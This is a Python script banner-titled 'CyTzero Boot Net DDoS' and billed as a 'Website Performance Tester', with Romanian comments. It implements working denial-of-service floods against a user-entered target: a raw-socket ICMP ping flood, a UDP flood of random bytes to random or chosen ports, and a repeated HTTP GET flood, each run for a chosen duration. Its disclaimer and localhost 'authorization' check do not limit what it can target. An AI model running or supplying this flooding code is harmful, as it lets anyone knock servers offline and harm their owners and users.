import os
import time
import socket
import random
import requests
from multiprocessing import Process
from colorama import init, Fore, Style

init()

def print_ascii_art():
    art = f"""
{Fore.RED}
                        )                                              )               (     (                
   (          *   )  ( /(                    (              *   )   ( /(           )   )\ )  )\ )              
   )\  (     )  /(  )\())  (   (          ( )\            )  /(   )\())   (   ( /(  (()/( (()/(              
 (((_) )\ )  ( )(_))((\_  ))\  )(    (    )((_))  (    (   ( )(_)) ((\_   ))\  )\())  /(_)) /(_))   (   (    
 )\___(()/( (_(_())  _((_)/((_)(()\   )\  ((_)_   )\   )\ (_(_())   _((_) /((_)(_))/  (_))_ (_))_    )\  )\   
((/ __|)(_))|_   _| |_  /(_))   ((_) ((_)  | _ ) ((_) ((_)|_   _|  | \| |(_))  | |_    |   \ |   \  ((_)((_)  
 | (__| || |  | |    / / / -_) | '_|/ _ \  | _ \/ _ \/ _ \  | |    | . |/ -_) |  _|   | |) || |) |/ _ \(_-<  
  \___|\_, |  |_|   /___|\___| |_|  \___/  |___/\___/\___/  |_|    |_|\_|\___|  \__|   |___/ |___/ \___//__/  
       |__/                                                                                                  
                                        Code By CyTZero
                                  Website Performance Tester    
{Style.RESET_ALL}
    """
    print(art)

def print_disclaimer():
    disclaimer = """
DISCLAIMER:
This script is intended for educational purposes and responsible testing only.
Using this script without explicit permission from the server owner is illegal and unethical. Ensure that you comply with all relevant laws and regulations when using this script.

The author of this script accepts no responsibility for any misuse or damage caused by the use of this script. Use it at your own risk.
"""
    print(disclaimer)

def check_server_authorization(server_url):
    try:
        response = requests.get(f"{server_url}/check_authorization", timeout=5)
        data = response.json()
        return data.get('authorized', False)
    except Exception:
        print(f"{Fore.RED}Could not connect to the server. Authorization check failed.{Style.RESET_ALL}")
        return False

def send_icmp_flood(target_ip, duration):
    """Trimite un flux de pachete ICMP (ping) către țintă."""
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = b'\x08\x00' + b'\x00' * 46  # Pachet ICMP simplu
    while time.time() - start_time < duration:
        try:
            sock.sendto(packet, (target_ip, 0))
        except Exception:
            pass

def send_random_packet_flood(target_ip, target_port, duration):
    """Trimite pachete TCP/UDP aleatorii către țintă."""
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = os.urandom(1024)  # Pachet de 1 KB aleator
    while time.time() - start_time < duration:
        try:
            port = target_port or random.randint(1, 65535)
            sock.sendto(message, (target_ip, port))
        except Exception:
            pass

def send_custom_http_flood(url, duration):
    """Trimite cereri HTTP repetate către un URL specific."""
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            requests.get(url, timeout=5)
        except Exception:
            pass

if __name__ == "__main__":
    print_ascii_art()
    print_disclaimer()

    SERVER_URL = "http://localhost:5000"

    print("Verificăm permisiunea de rulare...")
    if not check_server_authorization(SERVER_URL):
        print(f"{Fore.RED}Rularea programului a fost interzisă de serverul de control. Ieșire...{Style.RESET_ALL}")
        exit(1)

    print(f"{Fore.GREEN}Permisiune acordată de server. Continuăm...{Style.RESET_ALL}")
    
    choice = input("Choose the test type: (1) ICMP Flood (2) Random Packet Flood (3) Custom HTTP Flood: ")
    if choice == '1':
        target_ip = input("Enter target IP for ICMP Flood: ")
        duration = int(input("Enter duration of the test in seconds: "))
        send_icmp_flood(target_ip, duration)
    elif choice == '2':
        target_ip = input("Enter target IP for Random Packet Flood: ")
        target_port = int(input("Enter target port (or 0 for random): "))
        duration = int(input("Enter duration of the test in seconds: "))
        send_random_packet_flood(target_ip, target_port, duration)
    elif choice == '3':
        url = input("Enter the URL for HTTP Flood: ")
        duration = int(input("Enter duration of the test in seconds: "))
        send_custom_http_flood(url, duration)
    else:
        print("Invalid choice. Please select a valid option.")
